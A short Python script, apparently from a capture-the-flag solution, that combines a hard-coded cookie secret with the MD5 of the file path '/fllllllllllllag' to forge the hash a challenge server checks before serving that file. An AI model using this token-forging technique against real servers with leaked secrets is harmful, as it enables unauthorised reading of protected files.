import hashlib

file_name = '/fllllllllllllag'
cookie_secret = 'ea2ac168-1957-41f3-a67f-353c04110006'
m = hashlib.md5(cookie_secret.encode())
# print(m.hexdigest())
m.update(hashlib.md5(file_name.encode()).hexdigest().encode())
print(m.hexdigest())

